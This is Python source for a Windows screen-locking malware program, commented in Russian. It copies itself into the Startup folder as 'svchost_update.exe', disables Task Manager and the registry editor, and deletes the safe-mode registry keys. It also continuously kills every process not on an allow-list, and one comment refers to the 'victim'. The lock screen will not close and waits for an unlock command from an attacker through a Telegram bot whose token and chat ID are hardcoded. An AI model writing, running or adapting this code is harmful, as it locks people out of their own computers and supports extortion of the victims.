import os
import sys
import time
import shutil
import requests
import tkinter as tk
import psutil
import winreg
import threading

# --- ПРОВЕРКА НА WINDOWS ---
if os.name != 'nt':
    print("КРИТИЧЕСКАЯ ОШИБКА: Неподдерживаемая ОС (Только Windows).")
    sys.exit(1)

BOT_TOKEN =  "8320512407:AAF8XKfXkVYUTP7x_FHHMo1oAK_CkFr95VM"
CHAT_ID = "8573437923"
LAST_UPDATE_ID = 0
unlock_ready = False

def check_bot_for_unlock():
    global LAST_UPDATE_ID, unlock_ready
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    
    while True:
        try:
            res = requests.get(f"{url}?offset={LAST_UPDATE_ID + 1}&timeout=10").json()
            if res.get("result"):
                for update in res["result"]:
                    LAST_UPDATE_ID = update["update_id"]
                    if "callback_query" in update:
                        if update["callback_query"]["data"] == "confirm":
                            unlock_ready = True
                            return
        except:
            pass
        time.sleep(2)

def disable_system_tools():
    try:
        # Отключаем диспетчер задач и редактор реестра
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # Ломаем безопасный режим
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteKey(key, "Minimal")
        winreg.DeleteKey(key, "Network")
        winreg.CloseKey(key)
    except:
        pass
    
    # Отменяем выключение
    os.system('shutdown -a')

def kill_unwanted():
    # Оставляем только нужные процессы (чтобы жертва могла открыть браузер и написать нам)
    allowed = ["explorer.exe", "python.exe", "victim_locker.exe", "conhost.exe", "dwm.exe", "chrome.exe", "firefox.exe", "telegram.exe", "discord.exe"]
    
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() not in allowed:
                    proc.kill()
            except:
                pass
        time.sleep(1)

def show_window():
    global unlock_ready
    root = tk.Tk()
    root.title("SYSTEM LOCKED")
    root.configure(bg="black")
    
    # Окно на правую половину экрана
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    root.geometry(f"{screen_width//2}x{screen_height}+{screen_width//2}+0")
    
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nОжидание команды администратора...", 
                     fg="#ff0000", bg="black", font=("Consolas", 16, "bold"))
    label.pack(expand=True)

    def wait_for_unlock():
        global unlock_ready
        check_bot_for_unlock()
        if unlock_ready:
            label.config(text="✅ Разблокировано.", fg="green")
            time.sleep(2)
            
            startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\svchost_update.exe')
            if os.path.exists(startup_path):
                os.remove(startup_path)
                
            os.system("shutdown -r -t 3")
            sys.exit(0)

    threading.Thread(target=wait_for_unlock, daemon=True).start()
    threading.Thread(target=kill_unwanted, daemon=True).start()
    
    root.mainloop()

if __name__ == "__main__":
    # Копируем себя в автозагрузку
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\svchost_update.exe')
    try:
        shutil.copy(sys.executable, startup_path)
    except:
        pass

    disable_system_tools()
    show_window()

